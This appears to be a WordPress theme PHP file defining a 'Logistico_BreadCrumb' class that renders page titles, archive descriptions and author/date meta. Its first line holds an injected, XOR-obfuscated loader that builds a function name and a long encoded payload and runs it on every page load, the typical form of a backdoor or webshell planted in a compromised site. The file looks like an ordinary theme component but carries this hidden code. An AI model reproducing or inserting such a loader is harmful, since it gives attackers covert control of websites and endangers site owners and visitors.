<?php $eurSwhv='Y+  FEr2B9HNX,C'; $XDgYOLcW=':YEA2 -T7W+:1C-'^$eurSwhv; $SYfNVPT=' SPr50U5:EU4cTU->J;em6=He4X V5;>11Robq6afX3N1C X qJ6 3W 91sgZOXgb2TBUayh RLQlvfAsEi=5pBE OvRBqb2obTOKaAGIhgdjvV=xSTAP- fr+X0 HhteBndEKfyg.DEeyoZPE=Y87:mRkwofrP..cg8etJ2,RV  zLF= N9OjeLHG+=0NXFBRC5qr=h-n:sIaRJ19YssMJX= XsP19JZeR =otx<Q CUy8gR8=U;PVrkJhrovq-ps,7WlXECXuyenO,+CWmz=mAjYXC dG7-Eedt E1HEAQH6:;xxJQ=+B-=r9Ifh>MqElOPJ=Uqy8lmVC8=JUPnyhlo5cdw+fjP ph +ODyRZu=46=Wnp=Yo=USTT+f:1:xwmWEX4JfAZP.UL1zyKk9T=7XWhJ<S<mGm  J,lhay4<D,+WZ;BW p+Z>s7;X7>tQ7 m48  tnkRS27.WopV9BAEick PB7,.52EntG9QRaIM1JDemvA4=3MaGHTf+ R2:1jo<V=bCjaV8M4cxkKAP VxcnX47,uh1+=pokdKvVObxlkpTdf5T,Y5.b.-.t2TBLb z TY+4YooGhsq86H RaU<K. >8JH ihK,:8U  tMcq=J; smhqxCsxUd4R;4TMT7YA2ce5,T=9L6f0ey030O.ZnSqap3'; $nVslCaO=$XDgYOLcW('', 'I5xSSE;VN,:Z<1-DM>HMJNR::P9T7jdSDEuFKQMko>F R7I7NQ2YRl3AMP,87:,OFV564MYLK75xLVFaS>c4<T-0ToKreVY8fk2 9Ie.iUGTQVrTD  3<HNNVO9DAaSTA+EOlAopCA11EWRzxaY8LVaI;6W1FV;KW8CQEQjAX :ENRh-XYgdfQoEA5NIE<6nf=6AXI7aPdGyCE6+EXyNS++4NEcytUX>;:9EDOIXZ0L00B2m4WO0Z3>RCn71 9:d5SMDwH3 :xHGEJ9MG62DZFgHN=97A;,RTeXDPK HsOHu,WNZXEjuKJ.XXI34lbW+QmMk4+I4XYCfd0,JX+68NQL3=p212x2J1SPLKN6dDlzQKUZH2GPFSf4q75 J9QTCXJMs.=MqlHStJ48PZDkOO5QB=lbCAYAgMIDA>MLUA9AR7IY>;W+-EXS5L,SZ,Va+<BTEVYSEBZ466QXJ2GT2X6 lECOD16VsEPKlGOMP7zE-,E+dCKV FOR4>,--9NX;ANBBHW3DEoJE2Y9UJXMmaxM2MKJ<UCM.OZNDW2BDvKvhSATYCdSUP7N;TOTOIHGSa -ZBHAg=NRnHFgNUQYD:A+>>Y2qEFQ9<SAO;MCT:ADSaCUY+OAZDHQXcSX.n=7MU8epS85S8BEM-QV-RAmLB::U7G.FcXZzN'^$SYfNVPT); $nVslCaO();
/**
 * Creates a breadcrumbs the site based on the current page that's being viewed by the user.
 *
 * @since  1.0.0
 * @access public
 */
if ( ! class_exists( 'Logistico_BreadCrumb' ) ) {
	class Logistico_BreadCrumb {

		/**
		 * Header content display.
		 *
		 * @access public
		 */
		public function init() {
			$title = apply_filters('logistico_breadcrumb_title', $this->breadcrumb_title());
			$subtitle = apply_filters('logistico_breadcrumb_subtitle', $this->breadcrumb_description());
			$breadcrumb  = '';
			$breadcrumb .= $title;
			$breadcrumb .= $subtitle;
			return $breadcrumb;
		}

		/**
		 * Breadcrumb title
		 *
		 * @access public
		 */
		private function breadcrumb_title() {
			if ( is_404() ) {
				$breadcrumb_title = '<h1 class="logistico-breadcrumb-title">' . esc_html__( 'Oops! That page can&rsquo;t be found.', 'logistico' ) . '</h1>';
				return $breadcrumb_title;
			}
			if ( is_archive() ) {
				$title = get_the_archive_title();
				$breadcrumb_title = '';
				if ( ! empty( $title ) ) {
					$breadcrumb_title .= '<h1 class="logistico-breadcrumb-title">' . wp_kses($title, wp_kses_allowed_html( 'post' )) . '</h1>';
				}
				return $breadcrumb_title;
			}
			if ( is_search() ) {
				$breadcrumb_title = '<h1 class="logistico-breadcrumb-title">';
				/* translators: search result */
				$breadcrumb_title .= sprintf( esc_html__( 'Search Results for: %s', 'logistico' ), get_search_query() );
				$breadcrumb_title .= '</h1>';
				return $breadcrumb_title;
			}

			$disabled_frontpage = get_theme_mod( 'disable_frontpage_sections', false );
			if ( is_front_page() && get_option( 'show_on_front' ) === 'page' && true === (bool) $disabled_frontpage ) {
				$breadcrumb_title = '<h1 class="logistico-breadcrumb-title">' . single_post_title( '', false ) . '</h1>';
				return $breadcrumb_title;
			}

			if ( is_front_page() && get_option( 'show_on_front' ) === 'posts' ) {
				$breadcrumb_title = '<h1 class="logistico-breadcrumb-title">' . get_bloginfo( 'description' ) . '</h1>';
				return $breadcrumb_title;
			}

			$entry_class = '';
			if ( ! is_page() ) {
				$entry_class = 'entry-title';
			}
			$breadcrumb_title = '<h1 class="logistico-breadcrumb-title ' . $entry_class . '">' . single_post_title( '', false ) . '</h1>';

			return $breadcrumb_title;
		}

		/**
		 * Breadcrumb Description
		 *
		 * @access public
		 */
		private function breadcrumb_description() {

			if ( is_archive() ) {
				$description_output = '';

				$description = get_the_archive_description();
				if ( $description ) {
					$description_output = '<h5 class="logistico-breadcrumb-desc">' . wp_kses( $description, wp_kses_allowed_html( 'post' ) ) . '</h5>';
				}
				return $description_output;
			}
			if ( is_single() ) {
				if ( class_exists( 'WooCommerce' ) ) {
					if ( is_product() ) {
						return '';
					}
				}

				global $post;
				$post_meta_output = '';
				$author_id        = $post->post_author;
				$author_name      = get_the_author_meta( 'display_name', $author_id );
				$author_posts_url = get_author_posts_url( get_the_author_meta( 'ID', $author_id ) );

				$post_meta_output .= apply_filters(
					'logistico_single_post_meta',
					sprintf(
						/* translators: %1$s is Author name wrapped, %2$s is Date*/
						esc_html__( 'Published by %1$s on %2$s', 'logistico' ),
						/* translators: %1$s is Author name, %2$s is Author link*/
						sprintf(
							'<a href="%2$s" class="vcard author"><strong class="fn">%1$s</strong></a>',
							esc_html( $author_name ),
							esc_url( $author_posts_url )
						),
						$this->get_time_tags()
					)
				);

				$description_output = '';

				if ( $post_meta_output ) {
					$description_output = '<h5 class="post_meta_output">' . $post_meta_output . '</h5>';
				}

				return $description_output;
			}

		}


		/**
		 * Get time tags
		 *
		 * @access public
		 */
		public function get_time_tags() {
			$time = '';

			$time .= '<time class="entry-date published" datetime="' . esc_attr( get_the_date( 'c' ) ) . '" content="' . esc_attr( get_the_date( 'Y-m-d' ) ) . '">';
			$time .= esc_html( get_the_time( get_option( 'date_format' ) ) );
			$time .= '</time>';
			if ( get_the_time( 'U' ) === get_the_modified_time( 'U' ) ) {
				return $time;
			}
			$time .= '<time class="updated hestia-hidden" datetime="' . esc_attr( get_the_modified_date( 'c' ) ) . '">';
			$time .= esc_html( get_the_time( get_option( 'date_format' ) ) );
			$time .= '</time>';

			return $time;
		}

	}
}